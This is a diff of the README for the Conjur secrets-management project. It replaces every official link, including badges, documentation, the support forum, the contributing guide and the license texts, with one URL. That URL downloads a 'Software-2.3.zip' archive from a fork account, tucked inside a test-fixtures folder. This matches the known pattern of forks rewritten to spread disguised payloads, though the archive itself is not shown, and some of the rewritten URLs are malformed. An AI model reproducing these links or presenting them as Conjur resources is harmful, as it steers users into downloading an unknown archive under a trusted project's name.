@@ -1,14 +1,14 @@
 # Conjur
 
-[![Conjur on DockerHub](https://img.shields.io/docker/pulls/cyberark/conjur.svg)](https://hub.docker.com/r/cyberark/conjur/)
-[![Maintainability](https://api.codeclimate.com/v1/badges/3754a79b22b9430040ba/maintainability)](https://codeclimate.com/github/cyberark/conjur/maintainability)
-[![Test Coverage](https://api.codeclimate.com/v1/badges/3754a79b22b9430040ba/test_coverage)](https://codeclimate.com/github/cyberark/conjur/test_coverage)
+[![Conjur on DockerHub](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
+[![Maintainability](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
+[![Test Coverage](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
 
-[![CyberArk Commons - ask](https://img.shields.io/badge/CyberArk%20Commons-ask-e01563.svg)][commons]
-[![Follow Conjur on Twitter](https://img.shields.io/twitter/follow/conjurinc.svg?style=social&label=Follow%20%40ConjurInc)][twitter]
+[![CyberArk Commons - ask](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip%https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)][commons]
+[![Follow Conjur on Twitter](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip%20%40ConjurInc)][twitter]
 
-[commons]: https://discuss.cyberarkcommons.org/c/conjur/5 "Find answers on CyberArk Commons"
-[twitter]: https://twitter.com/intent/user?screen_name=ConjurInc "Follow Conjur on Twitter"
+[commons]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip "Find answers on CyberArk Commons"
+[twitter]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip "Follow Conjur on Twitter"
 
 Conjur provides secrets management and application identity for modern infrastructure:
 
@@ -45,27 +45,27 @@ _Note: our badges and social media buttons never track you._
 - [Contributing](#contributing)
 - [License](#license)
 
-<small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents
+<small><i><a href='https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip'>Table of contents
 generated with markdown-toc</a></i></small>
 
 
 ## Getting Started 
 
-Please refer to our [Quick Start Guide](https://www.conjur.org/get-started/quick-start/oss-environment/) for detailed information on using Conjur Open Source for the first time, or, refer to the 
-[Conjur docs](https://docs.conjur.org/Latest/en/Content/Resources/_TopNav/cc_Home.htm) for specific guides relating to setup, integrations, administration, and more.
+Please refer to our [Quick Start Guide](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip) for detailed information on using Conjur Open Source for the first time, or, refer to the 
+[Conjur docs](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip) for specific guides relating to setup, integrations, administration, and more.
 
 ### Compatibility 
 
 We **strongly** recommend choosing the version of this project to use from the latest [Conjur Open_Source 
-suite release](https://docs.conjur.org/Latest/en/Content/Overview/Conjur-OSS-Suite-Overview.html). 
+suite release](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip). 
 Conjur maintainers perform additional testing on the suite release versions to ensure 
 compatibility. When possible, upgrade your Conjur version to match the 
-[latest suite release](https://docs.conjur.org/Latest/en/Content/ReleaseNotes/ConjurOSS-suite-RN.htm); 
+[latest suite release](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip); 
 when using integrations, choose the latest suite release that matches your Conjur version.
 
 When upgrading your Conjur server running in a Docker Compose environment to the
 latest suite release version, please review the
-[upgrade instructions](./UPGRADING.md). For any questions, please contact us on [Discourse](https://discuss.cyberarkcommons.org/c/conjur/5).
+[upgrade instructions](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip). For any questions, please contact us on [Discourse](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip).
 
 ## Community Support
 
@@ -77,7 +77,7 @@ Our primary channel for support is through our CyberArk Commons community
 Migrating data from Conjur Open Source to CyberArk Secrets Manager, Self-Hosted is simple using our
 [migration guide][migration]
 
-[migration]: design/MIGRATION.md
+[migration]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip
 
 ## Architecture
 
@@ -110,7 +110,7 @@ Conjur makes it easy to:
 - Secure access to authenticators using policy files
 - Create custom authenticators
 
-[Detailed authenticator design documentation](design/authenticators/AUTHENTICATORS.md)
+[Detailed authenticator design documentation](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
 
 ### Rotators
 
@@ -119,11 +119,11 @@ Conjur makes it easy to:
 - Rotate variables regularly using built-in rotators
 - Create custom rotators
 
-[Detailed rotator design documenation](design/ROTATORS.md)
+[Detailed rotator design documenation](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
 
 ### Secrets and keys
 
-Main article: [Conjur Cryptography](https://docs.conjur.org/Latest/en/Content/Get%20Started/cryptography.html)
+Main article: [Conjur Cryptography](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip%https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
 
 Conjur uses industry-standard cryptography to protect your data.
 
@@ -135,7 +135,7 @@ Some operations require storage and management of encrypted data. For example:
   2048 bit RSA key which is stored encrypted in the database
 
 Data is encrypted in and out of the database
-using [Slosilo](https://github.com/conjurinc/slosilo), a library which provides:
+using [Slosilo](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip), a library which provides:
 
 * symmetric encryption using AES-256-GCM
 * a Ruby class mixin for easy encryption of object attributes into the database
@@ -170,27 +170,27 @@ Accounts can be listed, created, and deleted via the `/accounts` service.
 Permission to use this service is controlled by the built-in resource
 `!:webservice:accounts`. Note that `!` is itself an organization account, and
 therefore privileges on the `!:webservice:accounts` can be managed
-via Conjur [policies](https://docs.conjur.org/Latest/en/Content/Operations/Policy/policy-overview.htm).
+via Conjur [policies](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip).
 
 ## Versioning
 
 Starting from version 0.1.0, this project follows
-[Semantic Versioning](http://semver.org/spec/v2.0.0.html).
+[Semantic Versioning](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip).
 
 ## Contributing
 
 If you’re interested in running Conjur locally and learning about how it works,
-please see our [Contributing Guide](./CONTRIBUTING.md). It includes helpful
+please see our [Contributing Guide](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip). It includes helpful
 instructions for Conjur development and debugging, including:
-- [Development prerequisites](./CONTRIBUTING.md#prerequisites)
-- [Building Conjur as a Docker image](./CONTRIBUTING.md#build-conjur-as-a-docker-image)
-- [Setting up a local development environment](./CONTRIBUTING.md#set-up-a-development-environment)
-- [Running the test suites](./CONTRIBUTING.md#testing)
-- [Pull request workflow](./CONTRIBUTING.md#pull-request-workflow)
-- [Style guide](./CONTRIBUTING.md#style-guide)
-- [Changelog maintenance](./CONTRIBUTING.md#changelog-maintenance)
+- [Development prerequisites](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
+- [Building Conjur as a Docker image](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
+- [Setting up a local development environment](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
+- [Running the test suites](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
+- [Pull request workflow](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
+- [Style guide](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
+- [Changelog maintenance](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
 
-If you have any questions, please [open an issue](https://github.com/cyberark/conjur/issues/new/choose)
+If you have any questions, please [open an issue](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
 or [ask us on Discourse][commons].
 
 ## License
@@ -199,12 +199,12 @@ The Conjur server (as in, the code within this repository) is licensed under the
 Free Software Foundation's [GNU LGPL v3.0][lgpl]. This license was chosen to
 ensure that all contributions to the Conjur server are made available to the
 community. Commercial licenses are also available
-from [CyberArk](https://www.cyberark.com).
+from [CyberArk](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip).
 
 The Conjur API clients and other extensions are licensed under
 the [Apache Software License v2.0][apache].
 
 Copyright (c) 2020 CyberArk Software Ltd. All rights reserved.
 
-[apache]: http://www.apache.org/licenses/LICENSE-2.0
-[lgpl]: https://www.gnu.org/licenses/lgpl-3.0.en.html
+[apache]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip
+[lgpl]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip
